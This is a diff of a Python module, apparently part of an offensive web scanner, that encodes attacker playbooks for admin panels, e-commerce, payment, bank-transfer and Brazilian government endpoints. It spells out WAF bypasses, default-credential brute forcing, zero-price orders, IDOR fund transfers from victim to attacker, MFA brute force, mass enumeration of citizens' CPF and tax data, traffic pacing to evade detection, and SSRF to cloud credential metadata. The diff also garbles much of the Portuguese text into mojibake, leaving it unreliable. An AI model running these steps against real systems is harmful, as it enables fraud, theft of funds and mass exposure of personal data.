@@ -1,15 +1,15 @@
-"""
+﻿"""
 MSE Hacker Reasoning Dictionary (HRD) v1.0
 =============================================
 Enterprise-grade offensive reasoning engine that maps every discovered
 route/finding to a full attacker Kill Chain decision tree.
 
 When the scanner finds route X, HRD provides:
-  1. THREAT MODEL — How an advanced attacker sees this route
-  2. DECISION LOGIC — WAF-aware reasoning: "if blocked here, pivot there"
-  3. CONFIRMATION CHAIN — Multi-step proof of exploitability
-  4. ESCALATION PATH — Where to pivot after confirmation
-  5. DATA CAPTURE — What sensitive data to look for (CPF, CARTAO, ORDER_ID)
+  1. THREAT MODEL  How an advanced attacker sees this route
+  2. DECISION LOGIC  WAF-aware reasoning: "if blocked here, pivot there"
+  3. CONFIRMATION CHAIN  Multi-step proof of exploitability
+  4. ESCALATION PATH  Where to pivot after confirmation
+  5. DATA CAPTURE  What sensitive data to look for (CPF, CARTAO, ORDER_ID)
 
 168 reasoning entries across:
   - 22 enterprise routes (fintech/gov/ecommerce/admin)
@@ -56,8 +56,8 @@ TECH_ERROR_SIGNATURES = {
         ],
         "tech": "AWS CloudFront CDN",
         "known_bypasses": [
-            "Origin header manipulation — set Origin: null to bypass CORS+CloudFront",
-            "Host header override — X-Forwarded-Host to reach origin directly",
+            "Origin header manipulation  set Origin: null to bypass CORS+CloudFront",
+            "Host header override  X-Forwarded-Host to reach origin directly",
             "Cache poisoning via X-Forwarded-Scheme: nothttps",
             "Path normalization: /./admin or /%2e/admin to bypass path rules",
         ],
@@ -71,8 +71,8 @@ TECH_ERROR_SIGNATURES = {
         ],
         "tech": "Vercel Serverless",
         "known_bypasses": [
-            "Serverless function timeout abuse — large payload forces cold start retry",
-            "_next/data path bypass — access server components directly",
+            "Serverless function timeout abuse  large payload forces cold start retry",
+            "_next/data path bypass  access server components directly",
             "Rewrite rule evasion via double-slash: //api/admin",
             "Edge function bypass via non-standard Content-Type headers",
         ],
@@ -87,7 +87,7 @@ TECH_ERROR_SIGNATURES = {
         ],
         "tech": "Cloudflare WAF",
         "known_bypasses": [
-            "Unicode normalization bypass — %EF%BC%85 instead of %",
+            "Unicode normalization bypass  %EF%BC%85 instead of %",
             "Chunked Transfer-Encoding to fragment payloads across chunks",
             "Multipart form-data with nested boundaries",
             "HTTP/2 pseudo-header smuggling via :path override",
@@ -119,9 +119,9 @@ TECH_ERROR_SIGNATURES = {
         "tech": "Express.js / Node.js",
         "known_bypasses": [
             "Prototype pollution via __proto__ or constructor.prototype in JSON body",
-            "HPP (HTTP Parameter Pollution) — duplicate params bypass middleware",
-            "JSON parser confusion — Content-Type: text/plain bypasses json middleware",
-            "Path normalization: /ADMIN vs /admin — case-insensitive routing bypass",
+            "HPP (HTTP Parameter Pollution)  duplicate params bypass middleware",
+            "JSON parser confusion  Content-Type: text/plain bypasses json middleware",
+            "Path normalization: /ADMIN vs /admin  case-insensitive routing bypass",
         ],
         "evasion_focus": "prototype_pollution",
     },
@@ -340,7 +340,7 @@ def _generate_mutant_payloads(original_payload: str, tech_profile: Dict, count: 
                 "technique": technique,
                 "evasion_focus": evasion_focus,
                 "payload": mutated[:500],
-                "description": f"Gen{generation} {technique} — {evasion_focus} variant #{i}",
+                "description": f"Gen{generation} {technique}  {evasion_focus} variant #{i}",
             })
         except Exception:
             mutants.append({
@@ -349,7 +349,7 @@ def _generate_mutant_payloads(original_payload: str, tech_profile: Dict, count: 
                 "technique": "fallback_raw",
                 "evasion_focus": evasion_focus,
                 "payload": original_payload[:500],
-                "description": f"Mutation failed — using original payload with encoding variant",
+                "description": f"Mutation failed  using original payload with encoding variant",
             })
 
     return mutants
@@ -375,7 +375,7 @@ def _identify_tech_from_response(status_code: int, headers: Dict, body: str) -> 
             "key": "unknown_500",
             "tech": "Unknown Server",
             "known_bypasses": [
-                "Retry with different Content-Type headers (JSON→form→multipart)",
+                "Retry with different Content-Type headers (JSONâ†’formâ†’multipart)",
                 "Send malformed JSON to trigger verbose error messages",
                 "Try HTTP method override via X-HTTP-Method-Override header",
                 "Fragment payload across multiple parameters",
@@ -432,7 +432,7 @@ def _register(pattern: str, category: str, threat: ThreatLevel,
             thought=s["thought"],
             action=s["action"],
             confirmation=s["confirm"],
-            fallback=s.get("fallback", "Skip — move to next vector"),
+            fallback=s.get("fallback", "Skip  move to next vector"),
             escalation=s.get("escalation"),
         ))
     HACKER_REASONING_DICTIONARY[pattern] = HackerPlaybook(
@@ -450,23 +450,23 @@ def _register(pattern: str, category: str, threat: ThreatLevel,
 
 _register(
     "/admin", "authentication", ThreatLevel.CRITICAL,
-    "Admin panel em 200 OK → bypass de autenticação ou força bruta com senhas padrão → acesso ao banco de clientes completo",
+    "Admin panel em 200 OK â†’ bypass de autenticaÃ§Ã£o ou forÃ§a bruta com senhas padrÃ£o â†’ acesso ao banco de clientes completo",
     [
-        {"phase": "recon", "thought": "Admin acessível publicamente — verificar se retorna 200/302/403",
-         "action": "GET /admin — analisar response code e body", "confirm": "Status 200 + formulário de login ou dashboard visível",
-         "fallback": "Se 403/WAF → tentar /admin.php, /administrator, /wp-admin, /cpanel"},
-        {"phase": "infiltration", "thought": "Se login form visível → tentar credenciais padrão antes de brute force",
+        {"phase": "recon", "thought": "Admin acessÃ­vel publicamente  verificar se retorna 200/302/403",
+         "action": "GET /admin  analisar response code e body", "confirm": "Status 200 + formulÃ¡rio de login ou dashboard visÃ­vel",
+         "fallback": "Se 403/WAF â†’ tentar /admin.php, /administrator, /wp-admin, /cpanel"},
+        {"phase": "infiltration", "thought": "Se login form visÃ­vel â†’ tentar credenciais padrÃ£o antes de brute force",
          "action": "POST /admin/login com admin:admin, admin:password, admin:123456, root:toor",
-         "confirm": "Redirect para dashboard ou cookie de sessão admin gerado",
-         "fallback": "Se rate-limited → pivotar para SSRF via /api/image para bypass interno",
-         "escalation": "Com acesso admin → dump de users table via /admin/users/export"},
-        {"phase": "data_capture", "thought": "Dashboard admin pode ter export de dados — buscar CSV/JSON endpoints",
+         "confirm": "Redirect para dashboard ou cookie de sessÃ£o admin gerado",
+         "fallback": "Se rate-limited â†’ pivotar para SSRF via /api/image para bypass interno",
+         "escalation": "Com acesso admin â†’ dump de users table via /admin/users/export"},
+        {"phase": "data_capture", "thought": "Dashboard admin pode ter export de dados  buscar CSV/JSON endpoints",
          "action": "GET /admin/users, /admin/orders, /admin/export?format=csv",
-         "confirm": "Response contém padrões: CPF, email, telefone, CARTAO, ORDER_ID",
-         "fallback": "Se não há export → verificar API interna via DevTools/JS sources",
-         "escalation": "Dados capturados → logar como 'Vazamento de Dados Sensíveis confirmado'"},
+         "confirm": "Response contÃ©m padrÃµes: CPF, email, telefone, CARTAO, ORDER_ID",
+         "fallback": "Se nÃ£o hÃ¡ export â†’ verificar API interna via DevTools/JS sources",
+         "escalation": "Dados capturados â†’ logar como 'Vazamento de Dados SensÃ­veis confirmado'"},
     ],
-    "Se Cloudflare detectado → evitar brute force direto. Usar SSRF silencioso via /api/image ou /api/proxy para bypass interno",
+    "Se Cloudflare detectado â†’ evitar brute force direto. Usar SSRF silencioso via /api/image ou /api/proxy para bypass interno",
     ["CPF", "CARTAO", "ORDER_ID", "email", "telefone", "senha_hash"],
     ["/admin/users", "/admin/orders", "/admin/export", "/admin/config", "/admin/database"],
     ["admin_dashboard_visible", "user_export_available", "session_cookie_admin"]
@@ -474,22 +474,22 @@ _register(
 
 _register(
     "/admin/products/update", "ecommerce_admin", ThreatLevel.CRITICAL,
-    "Rota de update sem auth → alteração massiva de preços/estoque. Atacante pode zerar preços ou inflacionar estoque",
+    "Rota de update sem auth â†’ alteraÃ§Ã£o massiva de preÃ§os/estoque. Atacante pode zerar preÃ§os ou inflacionar estoque",
     [
-        {"phase": "recon", "thought": "Endpoint de update de produtos — verificar se aceita PATCH/PUT sem token",
+        {"phase": "recon", "thought": "Endpoint de update de produtos  verificar se aceita PATCH/PUT sem token",
          "action": "PATCH /admin/products/update com {\"price\": 0.01, \"id\": 1}",
-         "confirm": "Status 200 + preço alterado na response ou no GET subsequente",
-         "fallback": "Se 401 → tentar com headers de admin copiados do JS bundle"},
-        {"phase": "exploitation", "thought": "Preço aceito → verificar se persiste no banco (não só cache)",
-         "action": "GET /api/products/1 — verificar se price reflete 0.01",
-         "confirm": "Preço retornado = 0.01 confirma persistência no DB",
-         "escalation": "Criar pedido com preço manipulado → capturar ORDER_ID como prova"},
-        {"phase": "data_capture", "thought": "Provar impacto financeiro — gerar pedido com valor manipulado",
+         "confirm": "Status 200 + preÃ§o alterado na response ou no GET subsequente",
+         "fallback": "Se 401 â†’ tentar com headers de admin copiados do JS bundle"},
+        {"phase": "exploitation", "thought": "PreÃ§o aceito â†’ verificar se persiste no banco (nÃ£o sÃ³ cache)",
+         "action": "GET /api/products/1  verificar se price reflete 0.01",
+         "confirm": "PreÃ§o retornado = 0.01 confirma persistÃªncia no DB",
+         "escalation": "Criar pedido com preÃ§o manipulado â†’ capturar ORDER_ID como prova"},
+        {"phase": "data_capture", "thought": "Provar impacto financeiro  gerar pedido com valor manipulado",
          "action": "POST /api/orders/create com produto a $0.01",
          "confirm": "ORDER_ID gerado com valor total manipulado",
-         "fallback": "Se order não cria → capturar screenshot do preço alterado como evidência"},
+         "fallback": "Se order nÃ£o cria â†’ capturar screenshot do preÃ§o alterado como evidÃªncia"},
     ],
-    "Usar HTTP verb tampering (PUT→PATCH→POST) para bypass de filtros por método",
+    "Usar HTTP verb tampering (PUTâ†’PATCHâ†’POST) para bypass de filtros por mÃ©todo",
     ["product_id", "price", "stock_quantity", "ORDER_ID"],
     ["/api/products", "/api/orders/create", "/checkout"],
     ["price_persisted_in_db", "order_created_with_manipulated_price"]
@@ -497,22 +497,22 @@ _register(
 
 _register(
     "/cart/update", "ecommerce", ThreatLevel.CRITICAL,
-    "Cart update → price override para $0.01 → gerar ORDER_ID válido → provar 'compra' da base por valor zero",
+    "Cart update â†’ price override para $0.01 â†’ gerar ORDER_ID vÃ¡lido â†’ provar 'compra' da base por valor zero",
     [
-        {"phase": "exploitation", "thought": "Endpoint de carrinho aceita price no body? → injetar unit_price=0.01",
+        {"phase": "exploitation", "thought": "Endpoint de carrinho aceita price no body? â†’ injetar unit_price=0.01",
          "action": "POST /cart/update com {\"items\":[{\"id\":1,\"unit_price\":0.01,\"quantity\":1}]}",
-         "confirm": "Response total reflete $0.01 — server accepted client-side price",
-         "fallback": "Se rejeitado → tentar negative price (-1) ou quantity overflow (999999×0.01)"},
-        {"phase": "exploitation", "thought": "Preço aceito no cart → avançar para checkout para confirmar persistência",
+         "confirm": "Response total reflete $0.01  server accepted client-side price",
+         "fallback": "Se rejeitado â†’ tentar negative price (-1) ou quantity overflow (999999Ã—0.01)"},
+        {"phase": "exploitation", "thought": "PreÃ§o aceito no cart â†’ avanÃ§ar para checkout para confirmar persistÃªncia",
          "action": "POST /checkout com cart_id manipulado",
-         "confirm": "Checkout processa com valor manipulado — ORDER_ID gerado",
-         "escalation": "ORDER_ID com $0.01 = prova de fraude lógica completa"},
-        {"phase": "data_capture", "thought": "Verificar se DB refletiu — GET na order para confirmar server-side",
-         "action": "GET /api/orders/{ORDER_ID} — verificar total_amount",
+         "confirm": "Checkout processa com valor manipulado  ORDER_ID gerado",
+         "escalation": "ORDER_ID com $0.01 = prova de fraude lÃ³gica completa"},
+        {"phase": "data_capture", "thought": "Verificar se DB refletiu  GET na order para confirmar server-side",
+         "action": "GET /api/orders/{ORDER_ID}  verificar total_amount",
          "confirm": "total_amount no DB = $0.01 confirma server-side price injection",
-         "fallback": "Se order não acessível → total do cart já é evidência suficiente"},
+         "fallback": "Se order nÃ£o acessÃ­vel â†’ total do cart jÃ¡ Ã© evidÃªncia suficiente"},
     ],
-    "Cloudflare pode bloquear requests suspeitos — usar encoding no body (base64 price field) ou fragment payload em múltiplos requests",
+    "Cloudflare pode bloquear requests suspeitos  usar encoding no body (base64 price field) ou fragment payload em mÃºltiplos requests",
     ["ORDER_ID", "total_amount", "unit_price", "cart_id"],
     ["/checkout", "/api/orders/create", "/checkout/price-override", "/api/payment"],
     ["server_accepted_client_price", "order_id_with_zero_value", "db_reflection_confirmed"]
@@ -520,16 +520,16 @@ _register(
 
 _register(
     "/checkout/price-override", "ecommerce", ThreatLevel.CRITICAL,
-    "Rota explícita de price-override → sem server-side validation = compra grátis",
+    "Rota explÃ­cita de price-override â†’ sem server-side validation = compra grÃ¡tis",
     [
-        {"phase": "exploitation", "thought": "Nome da rota já indica vulnerabilidade — price-override é red flag",
+        {"phase": "exploitation", "thought": "Nome da rota jÃ¡ indica vulnerabilidade  price-override Ã© red flag",
          "action": "POST /checkout/price-override com {\"override_price\": 0, \"reason\": \"loyalty_discount\"}",
-         "confirm": "Response aceita override → checkout total = $0.00",
-         "fallback": "Se bloqueado → tentar com discount_percent=100 ou coupon forge"},
-        {"phase": "data_capture", "thought": "Gerar pedido completo com preço zero como prova de impacto",
+         "confirm": "Response aceita override â†’ checkout total = $0.00",
+         "fallback": "Se bloqueado â†’ tentar com discount_percent=100 ou coupon forge"},
+        {"phase": "data_capture", "thought": "Gerar pedido completo com preÃ§o zero como prova de impacto",
          "action": "POST /api/orders/create com checkout override ativo",
          "confirm": "ORDER_ID gerado com total $0.00",
-         "escalation": "Reportar como CRITICAL — fraude lógica com impacto financeiro direto"},
+         "escalation": "Reportar como CRITICAL  fraude lÃ³gica com impacto financeiro direto"},
     ],
     "Fragmentar payload em headers customizados se WAF bloqueia body JSON",
     ["ORDER_ID", "override_price", "total_amount"],
@@ -539,18 +539,18 @@ _register(
 
 _register(
     "/coupons/validate", "ecommerce", ThreatLevel.HIGH,
-    "Validação de cupom → forjar cupom ADMIN_100_OFF com 100% desconto → compra grátis",
+    "ValidaÃ§Ã£o de cupom â†’ forjar cupom ADMIN_100_OFF com 100% desconto â†’ compra grÃ¡tis",
     [
-        {"phase": "exploitation", "thought": "Endpoint valida cupom — tentar códigos internos previsíveis",
+        {"phase": "exploitation", "thought": "Endpoint valida cupom  tentar cÃ³digos internos previsÃ­veis",
          "action": "POST /coupons/validate com {\"code\":\"ADMIN100OFF\",\"discount_percent\":100}",
          "confirm": "Response discount=100% ou valid=true",
-         "fallback": "Se rejeitado → enumerar cupons via /coupons/list ou brute force alfanumérico 4-6 chars"},
-        {"phase": "exploitation", "thought": "Cupom válido → aplicar no checkout e verificar se zera total",
+         "fallback": "Se rejeitado â†’ enumerar cupons via /coupons/list ou brute force alfanumÃ©rico 4-6 chars"},
+        {"phase": "exploitation", "thought": "Cupom vÃ¡lido â†’ aplicar no checkout e verificar se zera total",
          "action": "POST /checkout com coupon_code=ADMIN100OFF",
          "confirm": "Total do checkout = $0.00 com cupom aplicado",
-         "escalation": "Coupon forge + checkout = fraude lógica confirmada"},
+         "escalation": "Coupon forge + checkout = fraude lÃ³gica confirmada"},
     ],
-    "Encodar código do cupom em base64 ou URL encoding para bypass de WAF regex",
+    "Encodar cÃ³digo do cupom em base64 ou URL encoding para bypass de WAF regex",
     ["coupon_code", "discount_percent", "total_amount"],
     ["/checkout", "/promos/apply", "/cart/update"],
     ["coupon_forge_accepted", "hundred_percent_discount_applied"]
@@ -558,18 +558,18 @@ _register(
 
 _register(
     "/payments/authorize", "fintech", ThreatLevel.CRITICAL,
-    "Autorização de pagamento → interceptar e modificar amount → transação com valor alterado",
+    "AutorizaÃ§Ã£o de pagamento â†’ interceptar e modificar amount â†’ transaÃ§Ã£o com valor alterado",
     [
-        {"phase": "exploitation", "thought": "Payment authorize aceita amount no body → modificar para $0.01",
+        {"phase": "exploitation", "thought": "Payment authorize aceita amount no body â†’ modificar para $0.01",
          "action": "POST /payments/authorize com {\"amount\":0.01,\"currency\":\"BRL\",\"card_token\":\"tok_test\"}",
          "confirm": "Response com authorization_id + amount=0.01 aceito",
-         "fallback": "Se amount validado server-side → tentar currency confusion (USD→BRL rate exploit)"},
-        {"phase": "data_capture", "thought": "Autorização com valor manipulado = prova de falha em payment validation",
-         "action": "GET /payments/{authorization_id} — verificar amount persistido",
+         "fallback": "Se amount validado server-side â†’ tentar currency confusion (USDâ†’BRL rate exploit)"},
+        {"phase": "data_capture", "thought": "AutorizaÃ§Ã£o com valor manipulado = prova de falha em payment validation",
+         "action": "GET /payments/{authorization_id}  verificar amount persistido",
          "confirm": "Amount no DB = $0.01 confirma server-side payment bypass",
-         "escalation": "Pivotar para /transfer/internal se autenticado — mover fundos"},
+         "escalation": "Pivotar para /transfer/internal se autenticado  mover fundos"},
     ],
-    "Payment gateways têm WAF próprio — usar tokenização legítima com amount manipulado no body",
+    "Payment gateways tÃªm WAF prÃ³prio  usar tokenizaÃ§Ã£o legÃ­tima com amount manipulado no body",
     ["authorization_id", "amount", "card_token", "transaction_id"],
     ["/transfer/internal", "/ledger/balance", "/refunds/create"],
     ["payment_amount_manipulated", "authorization_with_zero_value"]
@@ -577,18 +577,18 @@ _register(
 
 _register(
     "/transfer/internal", "fintech", ThreatLevel.CRITICAL,
-    "Transferência interna → IDOR para mover fundos entre contas → escalar para cash-out",
+    "TransferÃªncia interna â†’ IDOR para mover fundos entre contas â†’ escalar para cash-out",
     [
-        {"phase": "exploitation", "thought": "Transferência usa from_account e to_account — tentar IDOR",
+        {"phase": "exploitation", "thought": "TransferÃªncia usa from_account e to_account  tentar IDOR",
          "action": "POST /transfer/internal com {\"from\":\"victim_id\",\"to\":\"attacker_id\",\"amount\":9999}",
          "confirm": "Transfer_id gerado + balance atualizado",
-         "fallback": "Se from validado via session → tentar via SSRF interno para bypass"},
-        {"phase": "privilege_escalation", "thought": "Transferência confirmada → verificar se limite diário é bypassável",
-         "action": "POST múltiplos transfers pequenos para bypass de daily limit",
-         "confirm": "Múltiplas transferências processadas sem bloqueio",
-         "escalation": "IDOR em transferência = CRITICAL — risco financeiro direto"},
+         "fallback": "Se from validado via session â†’ tentar via SSRF interno para bypass"},
+        {"phase": "privilege_escalation", "thought": "TransferÃªncia confirmada â†’ verificar se limite diÃ¡rio Ã© bypassÃ¡vel",
+         "action": "POST mÃºltiplos transfers pequenos para bypass de daily limit",
+         "confirm": "MÃºltiplas transferÃªncias processadas sem bloqueio",
+         "escalation": "IDOR em transferÃªncia = CRITICAL  risco financeiro direto"},
     ],
-    "Rate limiting provável — distribuir requests em intervalos de 2-3s para parecer orgânico",
+    "Rate limiting provÃ¡vel  distribuir requests em intervalos de 2-3s para parecer orgÃ¢nico",
     ["transfer_id", "from_account", "to_account", "amount", "balance"],
     ["/ledger/balance", "/payments/authorize", "/accounts/details"],
     ["idor_transfer_confirmed", "balance_changed", "daily_limit_bypassed"]
@@ -596,18 +596,18 @@ _register(
 
 _register(
     "/ledger/balance", "fintech", ThreatLevel.HIGH,
-    "Endpoint de saldo → IDOR para ler balanço de outras contas → enumeração de clientes ricos",
+    "Endpoint de saldo â†’ IDOR para ler balanÃ§o de outras contas â†’ enumeraÃ§Ã£o de clientes ricos",
     [
-        {"phase": "exploitation", "thought": "Balance endpoint com account_id no path/query → IDOR sequencial",
-         "action": "GET /ledger/balance?account_id=1,2,3,...100 — enumerar saldos",
+        {"phase": "exploitation", "thought": "Balance endpoint com account_id no path/query â†’ IDOR sequencial",
+         "action": "GET /ledger/balance?account_id=1,2,3,...100  enumerar saldos",
          "confirm": "Responses com diferentes balances confirmam IDOR",
-         "fallback": "Se UUID → tentar account_id do JWT decodificado"},
-        {"phase": "data_capture", "thought": "Saldos expostos → classificar contas por valor para target prioritization",
+         "fallback": "Se UUID â†’ tentar account_id do JWT decodificado"},
+        {"phase": "data_capture", "thought": "Saldos expostos â†’ classificar contas por valor para target prioritization",
          "action": "Catalogar contas com saldo > $10k como alvos de alto valor",
          "confirm": "Lista de contas com saldos capturada",
          "escalation": "Pivotar para /transfer/internal com contas de alto valor"},
     ],
-    "Se rate-limited → usar múltiplos IPs via proxy rotation ou SSRF bounce",
+    "Se rate-limited â†’ usar mÃºltiplos IPs via proxy rotation ou SSRF bounce",
     ["account_id", "balance", "currency", "account_holder"],
     ["/transfer/internal", "/accounts/details", "/payments/authorize"],
     ["idor_balance_exposed", "multiple_accounts_enumerated"]
@@ -615,18 +615,18 @@ _register(
 
 _register(
     "/auth/mfa/challenge", "authentication", ThreatLevel.HIGH,
-    "MFA challenge → bypass via code reuse, race condition, ou fallback SMS interception",
+    "MFA challenge â†’ bypass via code reuse, race condition, ou fallback SMS interception",
     [
-        {"phase": "infiltration", "thought": "MFA pode ter fallback fraco — verificar se aceita código expirado",
-         "action": "POST /auth/mfa/challenge com código usado anteriormente (replay attack)",
-         "confirm": "MFA aceita código reutilizado → bypass de 2FA",
-         "fallback": "Se replay bloqueado → tentar race condition com 2 requests simultâneos"},
-        {"phase": "infiltration", "thought": "Verificar se MFA tem rate limit — brute force 6 dígitos = 1M combinações",
+        {"phase": "infiltration", "thought": "MFA pode ter fallback fraco  verificar se aceita cÃ³digo expirado",
+         "action": "POST /auth/mfa/challenge com cÃ³digo usado anteriormente (replay attack)",
+         "confirm": "MFA aceita cÃ³digo reutilizado â†’ bypass de 2FA",
+         "fallback": "Se replay bloqueado â†’ tentar race condition com 2 requests simultÃ¢neos"},
+        {"phase": "infiltration", "thought": "Verificar se MFA tem rate limit  brute force 6 dÃ­gitos = 1M combinaÃ§Ãµes",
          "action": "POST 000000-999999 em paralelo (batch de 100/request)",
-         "confirm": "Código correto encontrado → sessão autenticada sem MFA legítimo",
-         "escalation": "MFA bypass → acesso total à conta → pivotar para dados sensíveis"},
+         "confirm": "CÃ³digo correto encontrado â†’ sessÃ£o autenticada sem MFA legÃ­timo",
+         "escalation": "MFA bypass â†’ acesso total Ã  conta â†’ pivotar para dados sensÃ­veis"},
     ],
-    "MFA brute force detectável — usar time-based prediction se TOTP (janela de 30s)",
+    "MFA brute force detectÃ¡vel  usar time-based prediction se TOTP (janela de 30s)",
     ["mfa_code", "session_token", "user_id"],
     ["/admin", "/accounts/details", "/transfer/internal"],
     ["mfa_code_reused", "mfa_brute_force_successful", "mfa_race_condition"]
@@ -634,18 +634,18 @@ _register(
 
 _register(
     "/citizen/registry", "government", ThreatLevel.CRITICAL,
-    "Registro civil → dados de CPF, RG, CNH expostos → venda em mercado negro",
+    "Registro civil â†’ dados de CPF, RG, CNH expostos â†’ venda em mercado negro",
     [
-        {"phase": "exploitation", "thought": "Registry com citizen_id → IDOR para acessar registros de outros cidadãos",
-         "action": "GET /citizen/registry?id=1,2,3...1000 — enumeração sequencial",
-         "confirm": "Response contém CPF, RG, nome, endereço de cidadãos diferentes",
-         "fallback": "Se UUID → extrair IDs do JWT ou de responses anteriores"},
-        {"phase": "data_capture", "thought": "Dados de cidadão expostos → verificar se inclui documentos sensíveis",
-         "action": "Buscar padrões: CPF (XXX.XXX.XXX-XX), RG, CNH, endereço, telefone",
-         "confirm": "Padrão CPF/RG encontrado na response → dados pessoais expostos",
-         "escalation": "CRITICAL — vazamento de dados pessoais em massa"},
+        {"phase": "exploitation", "thought": "Registry com citizen_id â†’ IDOR para acessar registros de outros cidadÃ£os",
+         "action": "GET /citizen/registry?id=1,2,3...1000  enumeraÃ§Ã£o sequencial",
+         "confirm": "Response contÃ©m CPF, RG, nome, endereÃ§o de cidadÃ£os diferentes",
+         "fallback": "Se UUID â†’ extrair IDs do JWT ou de responses anteriores"},
+        {"phase": "data_capture", "thought": "Dados de cidadÃ£o expostos â†’ verificar se inclui documentos sensÃ­veis",
+         "action": "Buscar padrÃµes: CPF (XXX.XXX.XXX-XX), RG, CNH, endereÃ§o, telefone",
+         "confirm": "PadrÃ£o CPF/RG encontrado na response â†’ dados pessoais expostos",
+         "escalation": "CRITICAL  vazamento de dados pessoais em massa"},
     ],
-    "Government sites geralmente não têm WAF avançado — requests diretos funcionam",
+    "Government sites geralmente nÃ£o tÃªm WAF avanÃ§ado  requests diretos funcionam",
     ["CPF", "RG", "CNH", "nome", "endereco", "telefone", "data_nascimento"],
     ["/tax/declaration", "/benefits/status", "/identity/validate"],
     ["cpf_pattern_found", "citizen_data_enumerated", "pii_exposed"]
@@ -653,18 +653,18 @@ _register(
 
 _register(
     "/tax/declaration", "government", ThreatLevel.CRITICAL,
-    "Declaração fiscal → dados financeiros de cidadãos → renda, patrimônio, dependentes",
+    "DeclaraÃ§Ã£o fiscal â†’ dados financeiros de cidadÃ£os â†’ renda, patrimÃ´nio, dependentes",
     [
-        {"phase": "exploitation", "thought": "Tax declaration com citizen_id → IDOR para ler declarações fiscais",
-         "action": "GET /tax/declaration?cpf=XXX.XXX.XXX-XX — tentar CPFs sequenciais",
-         "confirm": "Response contém renda, patrimônio, deduções de outro cidadão",
-         "fallback": "Se CPF validado → usar CPFs públicos de empresários famosos como PoC"},
-        {"phase": "data_capture", "thought": "Dados fiscais = alto valor — catalogar campos expostos",
+        {"phase": "exploitation", "thought": "Tax declaration com citizen_id â†’ IDOR para ler declaraÃ§Ãµes fiscais",
+         "action": "GET /tax/declaration?cpf=XXX.XXX.XXX-XX  tentar CPFs sequenciais",
+         "confirm": "Response contÃ©m renda, patrimÃ´nio, deduÃ§Ãµes de outro cidadÃ£o",
+         "fallback": "Se CPF validado â†’ usar CPFs pÃºblicos de empresÃ¡rios famosos como PoC"},
+        {"phase": "data_capture", "thought": "Dados fiscais = alto valor  catalogar campos expostos",
          "action": "Extrair: renda_anual, patrimonio_total, dependentes, fontes_pagadoras",
-         "confirm": "Dados fiscais completos capturados → confirmar vazamento LGPD",
-         "escalation": "Reportar como violação LGPD/GDPR — dados fiscais são categoria especial"},
+         "confirm": "Dados fiscais completos capturados â†’ confirmar vazamento LGPD",
+         "escalation": "Reportar como violaÃ§Ã£o LGPD/GDPR  dados fiscais sÃ£o categoria especial"},
     ],
-    "Rate limit provável em gov — usar intervalos de 5s entre requests",
+    "Rate limit provÃ¡vel em gov  usar intervalos de 5s entre requests",
     ["CPF", "renda_anual", "patrimonio", "dependentes", "fontes_pagadoras"],
     ["/citizen/registry", "/benefits/status", "/identity/validate"],
     ["tax_data_exposed", "income_data_leaked", "lgpd_violation"]
@@ -672,17 +672,17 @@ _register(
 
 _register(
     "/benefits/status", "government", ThreatLevel.HIGH,
-    "Status de benefícios → IDOR para verificar se cidadão recebe auxílio → fraude social",
+    "Status de benefÃ­cios â†’ IDOR para verificar se cidadÃ£o recebe auxÃ­lio â†’ fraude social",
     [
-        {"phase": "exploitation", "thought": "Benefits status com citizen_id → IDOR para status de outros",
+        {"phase": "exploitation", "thought": "Benefits status com citizen_id â†’ IDOR para status de outros",
          "action": "GET /benefits/status?cpf=XXX.XXX.XXX-XX",
-         "confirm": "Response mostra benefícios ativos de outro cidadão",
-         "fallback": "Se protegido → verificar /api/benefits/batch para export em massa"},
-        {"phase": "data_capture", "thought": "Dados de benefícios = informação social sensível",
+         "confirm": "Response mostra benefÃ­cios ativos de outro cidadÃ£o",
+         "fallback": "Se protegido â†’ verificar /api/benefits/batch para export em massa"},
+        {"phase": "data_capture", "thought": "Dados de benefÃ­cios = informaÃ§Ã£o social sensÃ­vel",
          "action": "Catalogar: tipo_beneficio, valor_mensal, dependentes, status",
-         "confirm": "Informação social capturada → violação de privacidade confirmada"},
+         "confirm": "InformaÃ§Ã£o social capturada â†’ violaÃ§Ã£o de privacidade confirmada"},
     ],
-    "Endpoints gov costumam confiar em IP interno — SSRF pode bypass autenticação",
+    "Endpoints gov costumam confiar em IP interno  SSRF pode bypass autenticaÃ§Ã£o",
     ["CPF", "tipo_beneficio", "valor_mensal", "status_beneficio"],
     ["/citizen/registry", "/tax/declaration"],
     ["benefit_data_exposed", "social_data_leaked"]
@@ -690,18 +690,18 @@ _register(
 
 _register(
     "/identity/validate", "government", ThreatLevel.HIGH,
-    "Validação de identidade → oracle de CPF — confirmar se CPF existe e extrair dados associados",
+    "ValidaÃ§Ã£o de identidade â†’ oracle de CPF  confirmar se CPF existe e extrair dados associados",
     [
-        {"phase": "recon", "thought": "Identity validate = oracle — retorna valid/invalid para CPF",
+        {"phase": "recon", "thought": "Identity validate = oracle  retorna valid/invalid para CPF",
          "action": "POST /identity/validate com {\"document_type\":\"CPF\",\"document\":\"XXX.XXX.XXX-XX\"}",
-         "confirm": "Response diferencia CPF válido de inválido → oracle de enumeração",
-         "fallback": "Se rate-limited → usar batch endpoint ou SSRF interno"},
-        {"phase": "exploitation", "thought": "Oracle de CPF + response com nome → data enrichment attack",
+         "confirm": "Response diferencia CPF vÃ¡lido de invÃ¡lido â†’ oracle de enumeraÃ§Ã£o",
+         "fallback": "Se rate-limited â†’ usar batch endpoint ou SSRF interno"},
+        {"phase": "exploitation", "thought": "Oracle de CPF + response com nome â†’ data enrichment attack",
          "action": "Enumerar CPFs e coletar nomes associados",
-         "confirm": "Nome retornado junto com validação → dados pessoais vazando",
+         "confirm": "Nome retornado junto com validaÃ§Ã£o â†’ dados pessoais vazando",
          "escalation": "Combinar com /citizen/registry para profile completo"},
     ],
-    "Usar encoding de CPF (sem pontos/traços) para bypass de input validation",
+    "Usar encoding de CPF (sem pontos/traÃ§os) para bypass de input validation",
     ["CPF", "nome", "data_nascimento", "document_type"],
     ["/citizen/registry", "/tax/declaration", "/benefits/status"],
     ["cpf_oracle_confirmed", "name_leaked_via_validation"]
@@ -709,27 +709,27 @@ _register(
 
 _register(
     "ssrf_confirmed", "infrastructure", ThreatLevel.CRITICAL,
-    "SSRF confirmado → não só reportar, mas PROVAR acesso a dados internos: Redis KEYS *, AWS credentials, DB structure",
+    "SSRF confirmado â†’ nÃ£o sÃ³ reportar, mas PROVAR acesso a dados internos: Redis KEYS *, AWS credentials, DB structure",
     [
-        {"phase": "infiltration", "thought": "SSRF permite acesso à rede interna — priorizar cloud metadata sobre tudo",
-         "action": "SSRF → http://169.254.169.254/latest/meta-data/iam/security-credentials/",
